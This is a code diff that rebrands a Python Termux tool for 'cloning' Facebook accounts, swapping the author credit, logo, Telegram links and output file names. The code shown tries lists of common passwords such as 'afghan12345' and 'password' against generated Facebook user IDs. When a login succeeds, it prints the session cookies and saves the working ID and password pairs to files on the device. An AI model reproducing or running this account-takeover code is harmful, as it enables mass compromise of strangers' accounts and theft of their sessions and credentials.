@@ -1,4 +1,4 @@
-#created by Kefayat Moradi  
+#created by Mirwais Danishyar  
  #!/usr/bin/python3 
  #---------------------[IMPORT]---------------------# 
  from bs4 import BeautifulSoup as sop 
@@ -524,15 +524,14 @@
  logo =                                          ("""    
   
   
- \033[1;90m     /:   /:  /:/:/:/:  /:/:/:/:  /:  /:      /:  /:  /:/:/:/:/: 
- \033[1;91m     /: /:    /:        /:       /:/:  /:    /:  /:/:     /:      
- \033[1;93m     /:/:     /:/:/:/:  /:/:/:  /:  /:   /:/:   /:  /:    /:      
- \033[1;92m     /:  /:   /:        /:     /:/:/:/:   /:   /:/:/:/:   /:         
- \033[1;92m     /:    /: /:/:/:/:  /:    /:      /:  /:  /:      /:  /:    
-                           
- \033[1;32m               \033[1;35mCREATED BY\33[0;m   :  \033[1;31mA\33[0;m\033[1;39m F \033[1;35mG\33[0;m 
- \033[1;32m               \033[1;32mAUTHOR       :  \033[1;32mKefayat Moradi 
- \033[1;32m               \033[1;36mGITHUB       :  \033[1;93mkefayatmoradi 
+ \033[1;90m                   db    Yb        dP  8b   d8  
+ \033[1;91m                  dPYb    Yb  db  dP   8YbmdP8  \033[1;91m E 
+ \033[1;93m                 dPwwYb    YbdPYbdP    8  "  8   \033[1;93m  N 
+ \033[1;92m                dP    Yb    YP  YP     8     8      \033[1;92m D 
+  
+ \033[1;32m               \033[1;35mCREATED BY\33[0;m   :  \033[1;31mA.W.M\33[0;m\033[1;39m Pro \033[1;35mTeam\33[0;m 
+ \033[1;32m               \033[1;32mAUTHOR       :  \033[1;32mMirwais Danishyar 
+ \033[1;32m               \033[1;36mGITHUB       :  \033[1;33mBestProfessional 
  \033[1;32m               \033[1;32mSTATUS       :  \033[1;32mPermium 
  \033[1;32m               \033[1;34mVIRSION      :  \033[1;31m1.5.0 [ E.N.D ] 
  \33[37;44m\t         The best thing ! to do is to Start it..\33[0;m  
@@ -540,7 +539,7 @@
  """) 
   
  clear() 
- os.system("xdg-open https://www.facebook.com/profile.php?id=100046690249549") 
+ os.system("xdg-open https://www.facebook.com/subhanullah.niazay") 
  xxxx = str(len(ugen)) 
   
  NameX =input('\033[1;97m[+]\033[1;92mYOUR NAME \033[1;91m: \033[1;96m') 
@@ -591,18 +590,18 @@
      print(f"\033[1;97m[+] \033[1;92mNAME \033[1;91m: \033[1;96m{NameX}") 
      print('\033[1;32m--------------------------------------------------------------')  
      print(f"\033[1;97m[01] \033[1;92mSTART CLONING") 
-     print(f"\033[1;97m[02] \033[1;92MJOIN TO AFG Termux command FB group") 
-     print(f"\033[1;97m[03] \033[1;92mJOIN TO AFG TERMUX COMMAND TELEGRAM") 
+     print(f"\033[1;97m[02] \033[1;92mJOIN TO BEST TECHNICAL TELEGRAM") 
+     print(f"\033[1;97m[03] \033[1;92mJOIN TO AWM PROGRAMING TELEGRAM") 
      print(f"\033[1;97m[00] \033[1;92mEXIT ") 
      print('\033[1;32m--------------------------------------------------------------')  
      mirwais = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT \033[1;37m: \033[1;36m") 
      if mirwais in ["1","01"]: 
          passx() 
      elif mirwais in ["2","02"]: 
-         os.system("xdg-open https://www.facebook.com/groups/3508391782738119") 
+         os.system("xdg-open https://t.me/best_technicals") 
          main() 
      elif mirwais in ["3","03"]: 
-         os.system("xdg-open https://t.me/AFGTERMUXKEFAYAT") 
+         os.system("xdg-open https://t.me/AWM_PROGRAMING") 
          main() 
      elif mirwais in ["0","00"]: 
         exit() 
@@ -742,13 +741,13 @@
          print('\033[1;32m--------------------------------------------------------------')  
          for love in user: 
              uid = code+love 
-             pwx = [love,'afghan12345', 'afghan1234', 'KHAN1122', 'KHAN KHAN', 'PAKISTAN', 'KHAN123', 'KHAN1234', 'KHANKHAN', 'AFGHANISTAN', '500600', 'KHAN786', '786786', '1122334455', 'AFGHAN123', '1234512345', 'KABUL1234', '100200', 'AFGHAN', 'AFGHAN1234', 'KABUL123', 'password'] 
+             pwx = [love,'afghan12345', 'afghan1234'] 
              manshera.submit(freeq,uid,pwx,tl) 
      print('') 
      print('\033[1;32m--------------------------------------------------------------')  
      print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp))) 
      print('\033[1;32m--------------------------------------------------------------')  
-     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/Kefayat-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/Kefayat-CP.txt') 
+     print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/B-T-CP.txt') 
      input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main() 
   
   
@@ -1905,7 +1904,7 @@
              if 'c_user' in log_cookies: 
                  coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]) 
                  uid = coki[151:166] 
-                 print(f'\r\33[1;97m[\033[1;96mKefayat-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;91m'+coki+ ' \n '+pro+' \033[0;97m') 
+                 print(f'\r\33[1;97m[\033[1;96mB-T-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;91m'+coki+ ' \n '+pro+' \033[0;97m') 
                  cek_apk(session,coki) 
                  open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n') 
                  ok.append(uid) 
@@ -1919,7 +1918,7 @@
              else: 
                  continue 
          loop+=1 
-         sys.stdout.write(f'\r\33[1;35m[Kefayat] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))),  
+         sys.stdout.write(f'\r\33[1;35m[AWM+B-T] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))),  
          sys.stdout.flush() 
      except: 
          pass  
